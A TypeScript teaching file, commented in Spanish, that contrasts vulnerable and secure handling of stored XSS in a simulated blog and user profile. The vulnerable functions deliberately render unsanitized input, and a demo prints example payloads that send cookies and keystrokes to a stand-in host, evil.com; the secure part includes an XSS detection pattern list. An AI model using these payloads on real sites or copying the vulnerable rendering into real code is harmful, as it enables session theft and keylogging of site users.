/**
 * XSS Stored/Persistent (Cross-Site Scripting Almacenado)
 *
 * Conceptos clave:
 * - XSS almacenado guarda el payload malicioso en la base de datos
 * - Más peligroso que XSS reflejado: afecta a múltiples usuarios
 * - Se ejecuta cada vez que se carga el contenido almacenado
 * - Común en: comentarios, perfiles, foros, mensajes
 *
 * Impacto:
 * - Afecta a todos los usuarios que vean el contenido
 * - Persistente: el ataque continúa hasta que se limpia la DB
 * - Puede escalar privilegios si afecta a administradores
 */

import { createHash } from 'crypto';

// ============================================================================
// Simulación de Base de Datos
// ============================================================================

interface Comment {
    id: number;
    author: string;
    content: string;
    timestamp: Date;
}

interface BlogPost {
    id: number;
    title: string;
    content: string;
    comments: Comment[];
}

// Base de datos en memoria (simulación)
const vulnerableDatabase: BlogPost[] = [];
const secureDatabase: BlogPost[] = [];
let commentIdCounter = 1;

// ============================================================================
// ❌ VULNERABLE: Almacenamiento sin sanitización
// ============================================================================

/**
 * VULNERABLE: Guarda comentarios sin sanitizar
 *
 * Problema: El contenido malicioso se almacena tal cual en la base de datos
 * y se sirve sin codificación a todos los usuarios
 */
export function vulnerableAddComment(
    postId: number,
    author: string,
    content: string
): void {
    const post = vulnerableDatabase.find(p => p.id === postId);

    if (!post) {
        throw new Error('Post no encontrado');
    }

    // ❌ NO HACER: Almacenar input del usuario sin sanitización
    const comment: Comment = {
        id: commentIdCounter++,
        author: author,  // Sin sanitizar
        content: content,  // Sin sanitizar
        timestamp: new Date(),
    };

    post.comments.push(comment);
}

/**
 * VULNERABLE: Renderiza comentarios sin codificación
 */
export function vulnerableRenderComments(postId: number): string {
    const post = vulnerableDatabase.find(p => p.id === postId);

    if (!post) {
        return '<p>Post no encontrado</p>';
    }

    let html = '<div class="comments">';

    post.comments.forEach(comment => {
        // ❌ NO HACER: Inyección directa de contenido almacenado
        html += `
            <div class="comment">
                <strong>${comment.author}</strong>
                <span class="date">${comment.timestamp.toLocaleDateString()}</span>
                <p>${comment.content}</p>
            </div>
        `;
    });

    html += '</div>';

    return html;
}

/**
 * VULNERABLE: Perfil de usuario sin sanitización
 */
export class VulnerableUserProfile {
    constructor(
        public username: string,
        public bio: string,
        public website: string,
    ) {}

    // ❌ NO HACER: Renderizar perfil sin codificación
    render(): string {
        return `
            <div class="profile">
                <h2>${this.username}</h2>
                <div class="bio">${this.bio}</div>
                <a href="${this.website}">Website</a>
            </div>
        `;
    }
}

/**
 * Demostración de ataque XSS almacenado
 */
export function demonstrateStoredXSSAttack(): void {
    console.log('\n=== Demostración de Ataque XSS Almacenado ===\n');

    // Crear un post de blog
    const blogPost: BlogPost = {
        id: 1,
        title: 'Mi Primer Post',
        content: 'Contenido del post...',
        comments: [],
    };
    vulnerableDatabase.push(blogPost);

    // Atacante deja un comentario malicioso
    const maliciousComment =
        '<script>fetch("http://evil.com/steal?cookie=" + document.cookie)</script>';

    console.log('1. Atacante envía comentario malicioso:');
    console.log(`   ${maliciousComment}`);

    vulnerableAddComment(1, 'Hacker', maliciousComment);

    console.log('\n2. Comentario almacenado en base de datos');

    // Víctima visita la página
    console.log('\n3. Víctima carga la página:');
    const renderedPage = vulnerableRenderComments(1);
    console.log(renderedPage);

    console.log('\n   ⚠️  El script se ejecuta en el navegador de TODOS los usuarios!');
    console.log('   ⚠️  Las cookies se envían al servidor del atacante!');

    // Payload más sofisticado: keylogger
    const keyloggerPayload = `
        <script>
        document.addEventListener('keypress', function(e) {
            fetch('http://evil.com/log?key=' + e.key);
        });
        </script>
    `;

    console.log('\n4. Payload de keylogger:');
    console.log(keyloggerPayload);
    console.log('   Capturaría todas las pulsaciones de teclas!');
}

// ============================================================================
// ✅ SECURE: Implementación protegida
// ============================================================================

/**
 * Sanitizador HTML robusto
 */
export class HTMLSanitizer {
    /**
     * Codifica entidades HTML
     */
    static encode(text: string): string {
        const htmlEntities: { [key: string]: string } = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#x27;',
            '/': '&#x2F;',
        };

        return text.replace(/[&<>"'\/]/g, char => htmlEntities[char] || char);
    }

    /**
     * Valida y sanitiza URLs
     */
    static sanitizeURL(url: string): string {
        // Permitir solo http/https
        const urlPattern = /^https?:\/\//i;

        if (!urlPattern.test(url)) {
            return '#';  // URL inválida
        }

        // Prevenir javascript: y data: URIs
        if (/^(javascript|data):/i.test(url)) {
            return '#';
        }

        return this.encode(url);
    }

    /**
     * Detecta patrones XSS conocidos
     */
    static detectXSS(input: string): boolean {
        const xssPatterns = [
            /<script[\s\S]*?>[\s\S]*?<\/script>/gi,
            /<iframe[\s\S]*?>/gi,
            /<object[\s\S]*?>/gi,
            /<embed[\s\S]*?>/gi,
            /javascript:/gi,
            /on\w+\s*=/gi,
            /<img[^>]+onerror/gi,
        ];

        return xssPatterns.some(pattern => pattern.test(input));
    }

    /**
     * Limpia completamente contenido HTML (solo texto plano)
     */
    static stripHTML(html: string): string {
        return html.replace(/<[^>]*>/g, '');
    }
}

/**
 * ✅ SECURE: Validador de contenido
 */
export class ContentValidator {
    static validateComment(content: string): {
        valid: boolean;
        sanitized: string;
        errors: string[];
    } {
        const errors: string[] = [];
        let sanitized = content;

        // Validar longitud
        const MAX_LENGTH = 1000;
        if (content.length > MAX_LENGTH) {
            errors.push(`Contenido excede ${MAX_LENGTH} caracteres`);
            return { valid: false, sanitized: '', errors };
        }

        // Detectar XSS
        if (HTMLSanitizer.detectXSS(content)) {
            errors.push('Contenido sospechoso detectado');
            return { valid: false, sanitized: '', errors };
        }

        // Sanitizar
        sanitized = HTMLSanitizer.encode(content);

        return { valid: true, sanitized, errors: [] };
    }

    static validateUsername(username: string): {
        valid: boolean;
        sanitized: string;
        errors: string[];
    } {
        const errors: string[] = [];

        // Solo alfanuméricos y guiones
        const usernamePattern = /^[a-zA-Z0-9_-]+$/;

        if (!usernamePattern.test(username)) {
            errors.push('Username contiene caracteres inválidos');
            return { valid: false, sanitized: '', errors };
        }

        if (username.length < 3 || username.length > 20) {
            errors.push('Username debe tener entre 3 y 20 caracteres');
            return { valid: false, sanitized: '', errors };
        }

        return { valid: true, sanitized: username, errors: [] };
    }
}

/**
 * ✅ SECURE: Almacenamiento con sanitización
 */
export function secureAddComment(
    postId: number,
    author: string,
    content: string
): { success: boolean; errors: string[] } {
    const post = secureDatabase.find(p => p.id === postId);

    if (!post) {
        return { success: false, errors: ['Post no encontrado'] };
    }

    // Validar username
    const authorValidation = ContentValidator.validateUsername(author);
    if (!authorValidation.valid) {
        return { success: false, errors: authorValidation.errors };
    }

    // Validar y sanitizar contenido
    const contentValidation = ContentValidator.validateComment(content);
    if (!contentValidation.valid) {
        return { success: false, errors: contentValidation.errors };
    }

    // Almacenar versión sanitizada
    const comment: Comment = {
        id: commentIdCounter++,
        author: authorValidation.sanitized,
        content: contentValidation.sanitized,
        timestamp: new Date(),
    };

    post.comments.push(comment);

    return { success: true, errors: [] };
}

/**
 * ✅ SECURE: Renderizado seguro con doble codificación
 */
export function secureRenderComments(postId: number): string {
    const post = secureDatabase.find(p => p.id === postId);

    if (!post) {
        return '<p>Post no encontrado</p>';
    }

    let html = '<div class="comments">';

    post.comments.forEach(comment => {
        // Codificar nuevamente antes de renderizar (defensa en profundidad)
        const safeAuthor = HTMLSanitizer.encode(comment.author);
        const safeContent = HTMLSanitizer.encode(comment.content);
        const safeDate = comment.timestamp.toLocaleDateString();

        html += `
            <div class="comment">
                <strong>${safeAuthor}</strong>
                <span class="date">${safeDate}</span>
                <p>${safeContent}</p>
            </div>
        `;
    });

    html += '</div>';

    return html;
}

/**
 * ✅ SECURE: Perfil de usuario seguro
 */
export class SecureUserProfile {
    private _username: string;
    private _bio: string;
    private _website: string;

    constructor(username: string, bio: string, website: string) {
        // Validar y sanitizar en el constructor
        const usernameValidation = ContentValidator.validateUsername(username);
        if (!usernameValidation.valid) {
            throw new Error('Username inválido');
        }

        this._username = usernameValidation.sanitized;
        this._bio = HTMLSanitizer.encode(bio);
        this._website = HTMLSanitizer.sanitizeURL(website);
    }

    render(): string {
        return `
            <div class="profile">
                <h2>${this._username}</h2>
                <div class="bio">${this._bio}</div>
                <a href="${this._website}" rel="noopener noreferrer">Website</a>
            </div>
        `;
    }
}

/**
 * Demostración de protección contra XSS almacenado
 */
export function demonstrateStoredXSSProtection(): void {
    console.log('\n=== Demostración de Protección contra XSS Almacenado ===\n');

    // Crear un post de blog seguro
    const blogPost: BlogPost = {
        id: 1,
        title: 'Mi Primer Post',
        content: 'Contenido del post...',
        comments: [],
    };
    secureDatabase.push(blogPost);

    const testInputs = [
        {
            author: 'Usuario123',
            content: 'Este es un comentario normal',
        },
        {
            author: 'Hacker',
            content: '<script>alert("XSS")</script>',
        },
        {
            author: '<script>evil</script>',
            content: 'Contenido normal',
        },
        {
            author: 'Usuario456',
            content: '<img src=x onerror=alert("XSS")>',
        },
    ];

    testInputs.forEach((input, index) => {
        console.log(`\n${index + 1}. Intentando agregar comentario:`);
        console.log(`   Author: ${input.author}`);
        console.log(`   Content: ${input.content}`);

        const result = secureAddComment(1, input.author, input.content);

        if (result.success) {
            console.log('   ✅ Comentario agregado exitosamente');
        } else {
            console.log('   ❌ Comentario rechazado:');
            result.errors.forEach(error => console.log(`      - ${error}`));
        }
    });

    console.log('\n=== Renderizado de comentarios seguros ===');
    const renderedComments = secureRenderComments(1);
    console.log(renderedComments);
}

/**
 * Comparación de enfoques
 */
export function printStoredXSSComparison(): void {
    console.log('\n=== XSS Almacenado: Vulnerable vs Seguro ===\n');

    console.log('❌ VULNERABLE:');
    console.log('   - Almacena contenido sin validación');
    console.log('   - Renderiza directamente desde DB');
    console.log('   - Afecta a TODOS los usuarios');
    console.log('   - Persistente hasta limpieza manual');

    console.log('\n✅ SEGURO:');
    console.log('   - Validación antes de almacenar');
    console.log('   - Sanitización al guardar');
    console.log('   - Codificación al renderizar (defensa en profundidad)');
    console.log('   - Validación estricta de usernames');
    console.log('   - Límites de longitud');

    console.log('\n📚 MEJORES PRÁCTICAS:');
    console.log('   1. Validar EN LA ENTRADA (antes de guardar)');
    console.log('   2. Sanitizar EN EL ALMACENAMIENTO');
    console.log('   3. Codificar EN LA SALIDA (defensa en profundidad)');
    console.log('   4. Usar Content Security Policy');
    console.log('   5. Implementar rate limiting para comentarios');
    console.log('   6. Moderación de contenido para sitios públicos');
    console.log('   7. Auditoría y logging de contenido sospechoso');
}

// ============================================================================
// Ejecución de Demostraciones
// ============================================================================

if (require.main === module) {
    console.log('╔════════════════════════════════════════════════════════╗');
    console.log('║     XSS ALMACENADO - Vulnerable vs Seguro             ║');
    console.log('╚════════════════════════════════════════════════════════╝');

    demonstrateStoredXSSAttack();
    demonstrateStoredXSSProtection();
    printStoredXSSComparison();

    console.log('\n✅ Demostración completada\n');
}
